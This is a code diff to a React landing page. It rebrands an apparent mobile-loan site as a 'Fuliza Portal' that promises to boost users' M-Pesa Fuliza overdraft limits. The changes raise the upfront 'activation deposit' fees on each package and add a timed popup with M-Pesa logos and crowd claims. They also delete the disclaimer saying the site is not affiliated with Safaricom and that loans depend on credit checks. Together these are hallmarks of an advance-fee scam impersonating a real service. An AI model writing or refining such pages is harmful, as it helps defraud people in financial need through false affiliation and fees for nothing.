@@ -1,21 +1,23 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { FaCheckCircle } from 'react-icons/fa';
 import logo from './assets/logo.jpg';
+import popImg from './assets/popImg.png';
+import mpesaLogo from './assets/mpesa.png';
 import LiveUpdates from './liveUpdates';
 
 const loanPackages = [
-  { name: 'Basic', amount: 3000, fee: 99 },
-  { name: 'Starter', amount: 5000, fee: 150 },
-  { name: 'Lite', amount: 8000, fee: 200, badge: 'Popular', badgeColor: 'bg-blue-500' },
-  { name: 'Standard', amount: 10000, fee: 250 },
-  { name: 'Bronze', amount: 15000, fee: 275 },
-  { name: 'Silver', amount: 20000, fee: 300 },
-  { name: 'Gold', amount: 25000, fee: 375, badge: 'Best Value', badgeColor: 'bg-orange-500' },
-  { name: 'Platinum', amount: 30000, fee: 450 },
-  { name: 'Pro', amount: 40000, fee: 600 },
-  { name: 'Elite', amount: 50000, fee: 750 },
-  { name: 'Ultra', amount: 60000, fee: 900 },
+  { name: 'Basic', amount: 3000, fee: 150 },
+  { name: 'Starter', amount: 5000, fee: 250 },
+  { name: 'Lite', amount: 8000, fee: 350, badge: 'Popular', badgeColor: 'bg-blue-500' },
+  { name: 'Standard', amount: 10000, fee: 400 },
+  { name: 'Bronze', amount: 15000, fee: 450 },
+  { name: 'Silver', amount: 20000, fee: 500 },
+  { name: 'Gold', amount: 25000, fee: 600, badge: 'Best Value', badgeColor: 'bg-orange-500' },
+  { name: 'Platinum', amount: 30000, fee: 700 },
+  { name: 'Pro', amount: 40000, fee: 800 },
+  { name: 'Elite', amount: 50000, fee: 900 },
+  { name: 'Ultra', amount: 60000, fee: 1000 },
   { name: 'Ultimate', amount: 80000, fee: 1200, badge: 'VIP', badgeColor: 'bg-red-500' },
 ];
 
@@ -24,11 +26,20 @@ function Home() {
 
   const [isLoading, setIsLoading] = useState(false);
   const [showModal, setShowModal] = useState(false);
+  const [showPromoModal, setShowPromoModal] = useState(false);
   const [selectedPackage, setSelectedPackage] = useState(null);
   const [phone, setPhone] = useState('');
   const [isVerifying, setIsVerifying] = useState(false);
   const [verificationCode, setVerificationCode] = useState('');
   const [isVerified, setIsVerified] = useState(false);
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowPromoModal(true);
+    }, 4000);
+
+    return () => clearTimeout(timer);
+  }, []);
 
   const scrollToPackages = () => {
     const section = document.getElementById('packages');
@@ -37,9 +48,17 @@ function Home() {
     }
   };
 
+  const handlePromoBoost = () => {
+    setShowPromoModal(false);
+    setTimeout(() => {
+      scrollToPackages();
+    }, 100);
+  };
+
   const handleUnlock = (pkg) => {
     setIsLoading(true);
     setSelectedPackage(pkg);
+    setShowPromoModal(false);
 
     setTimeout(() => {
       setIsLoading(false);
@@ -91,51 +110,48 @@ function Home() {
           <div className="flex items-center gap-2">
             <img 
               src={logo} 
-              alt="Mpesa Mobile Loans" 
+              alt="Fuliza Portal" 
               className="w-8 h-8 object-contain rounded-lg"
             />
-            <span className="font-bold text-base text-dark-900">Mpesa Mobile Loans</span>
+            <span className="font-bold text-base text-dark-900">Fuliza Portal</span>
           </div>
           <button
             onClick={scrollToPackages}
             className="bg-mpesa-500 active:bg-mpesa-600 text-white text-sm font-semibold px-4 py-2 rounded-full"
           >
-            Apply Now
+            Boost My Limit
           </button>
         </nav>
 
-        {/* Hero Section */}
         <section className="bg-gradient-to-b from-mpesa-50 to-white px-5 pt-8 pb-6">
           <div className="text-center">
             <div className="inline-flex items-center gap-2 bg-mpesa-100 text-mpesa-700 text-xs font-medium px-3 py-1.5 rounded-full mb-5">
               <span className="w-1.5 h-1.5 bg-mpesa-500 rounded-full animate-pulse"></span>
-              Instant Disbursement
+              Instant Fuliza Limit Boost
             </div>
 
             <h1 className="text-3xl font-extrabold text-dark-900 leading-tight mb-3">
-              Emergency funds in <span className="text-mpesa-500">60 seconds</span>
+              Increase Your <span className="text-mpesa-500">Fuliza Limit</span> Today
             </h1>
 
             <p className="text-sm text-gray-600 mb-7 leading-relaxed px-2">
-              Access flexible mobile loans directly to your M-Pesa. No paperwork, no queues.
+              From KSh 0 to KSh 100,000+. Kenyans have already boosted their income. Join them now!
             </p>
 
             <button
               onClick={scrollToPackages}
               className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold text-base py-3.5 rounded-xl shadow-lg shadow-mpesa-500/25"
             >
-              Apply for Loan Now
+              Boost My Fuliza Limit
             </button>
           </div>
         </section>
 
-        {/* Live Updates - Right below the Apply button */}
         <LiveUpdates />
 
-        {/* Loan Packages */}
         <section id="packages" className="px-4 py-8">
           <div className="text-center mb-6">
-            <h2 className="text-xl font-bold text-dark-900 mb-1">Loan Packages</h2>
+            <h2 className="text-xl font-bold text-dark-900 mb-1">Fuliza Packages</h2>
             <p className="text-sm text-gray-500">Select a limit to get started</p>
             <p className="text-xs text-mpesa-600 font-medium mt-1">12 Tiers Available</p>
           </div>
@@ -172,14 +188,13 @@ function Home() {
                   onClick={() => handleUnlock(pkg)}
                   className="w-full mt-4 bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3 rounded-xl text-sm"
                 >
-                  Unlock
+                  Unlock New Limit
                 </button>
               </div>
             ))}
           </div>
         </section>
 
-        {/* Why Trust Us */}
         <section className="px-4 py-8 bg-gray-50">
           <h2 className="text-xl font-bold text-dark-900 text-center mb-6">Why trust us?</h2>
 
@@ -203,37 +218,33 @@ function Home() {
                 </svg>
               </div>
               <div>
-                <h3 className="font-bold text-dark-900 text-sm mb-0.5">Instant Withdrawal</h3>
-                <p className="text-gray-600 text-xs leading-relaxed">Money hits your M-Pesa immediately after approval.</p>
+                <h3 className="font-bold text-dark-900 text-sm mb-0.5">Instant Fuliza Limit Boost</h3>
+                <p className="text-gray-600 text-xs leading-relaxed">Increases your Fuliza limit instantly with no paperwork or queues.</p>
               </div>
             </div>
           </div>
         </section>
 
-        {/* Footer */}
         <footer className="bg-dark-900 text-white px-5 pt-8 pb-6">
           <div className="text-center mb-6">
-            <h3 className="text-lg font-bold mb-3">Mpesa Mobile Loans</h3>
+            <h3 className="text-lg font-bold mb-3">Fuliza Portal</h3>
             <div className="space-y-1 text-gray-300 text-sm">
               <p>Support: 0700 000 000</p>
-              <p>Email: help@mpesamobileloans.co.ke</p>
+              <p>Email: help@mpesafuliza.co.ke</p>
               <p>Westlands, Nairobi, Kenya</p>
             </div>
           </div>
 
           <div className="border-t border-gray-700 pt-5">
             <p className="text-[11px] text-gray-400 text-center leading-relaxed">
-              Disclaimer: Loans are subject to credit assessment and terms & conditions.
-              The access fee is a one-time activation deposit required to unlock your chosen loan tier.
-              This service is not affiliated with Safaricom PLC but operates on the M-Pesa ecosystem.
+              The access fee is a one-time activation deposit required to unlock your new Fuliza limit.
             </p>
             <p className="text-[11px] text-gray-500 text-center mt-3">
-              © 2026 Mpesa Mobile Loans Kenya. All rights reserved.
+              © 2026 Fuliza Portal Kenya. All rights reserved.
             </p>
           </div>
         </footer>
 
-        {/* Full Page Loader */}
         {isLoading && (
           <div className="fixed inset-0 bg-black/40 z-50 flex items-center justify-center">
             <div className="bg-white rounded-2xl p-8 flex flex-col items-center">
@@ -243,7 +254,52 @@ function Home() {
           </div>
         )}
 
-        {/* Modal */}
+        {/* Promo Modal - shows 4s after page load */}
+        {showPromoModal && !showModal && !isLoading && (
+          <div className="fixed inset-0 bg-black/50 z-[60] flex items-center justify-center px-4">
+            <div className="bg-white w-full max-w-sm rounded-2xl p-5 shadow-2xl relative">
+              <button
+                onClick={() => setShowPromoModal(false)}
+                className="absolute top-3 right-3 text-gray-400 hover:text-gray-600 text-2xl leading-none"
+              >
+                ×
+              </button>
+
+              <h3 className="text-center font-bold text-dark-900 text-[17px] leading-snug px-4 mb-4">
+                Kenyans have already boosted their Fuliza Limits.
+              </h3>
+
+              <div className="w-full rounded-xl overflow-hidden mb-4 bg-gray-50">
+                <img
+                  src={popImg}
+                  alt="Fuliza limit boost"
+                  className="w-full h-auto object-cover"
+                />
+              </div>
+
+              <div className="flex items-center justify-center gap-6 mb-5">
+                <img
+                  src={logo}
+                  alt="Fuliza Portal"
+                  className="h-10 w-auto object-contain"
+                />
+                <img
+                  src={mpesaLogo}
+                  alt="M-Pesa"
+                  className="h-10 w-auto object-contain"
+                />
+              </div>
+
+              <button
+                onClick={handlePromoBoost}
+                className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 rounded-xl text-sm shadow-lg shadow-mpesa-500/25"
+              >
+                Boost My Fuliza Limit
+              </button>
+            </div>
+          </div>
+        )}
+
         {showModal && (
           <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center px-4">
             <div className="bg-white w-full max-w-sm p-6" style={{ borderRadius: '2px' }}>
@@ -305,7 +361,6 @@ function Home() {
                   </button>
                 </>
               ) : (
-                /* SUCCESS STATE - Logo + Checkmark */
                 <div className="text-center py-4">
                   <div className="flex items-center justify-center gap-3 mb-4">
                     <img 
@@ -326,7 +381,7 @@ function Home() {
                     className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm"
                     style={{ borderRadius: '2px' }}
                   >
-                    Apply Now
+                    Boost Now
                   </button>
                 </div>
               )}
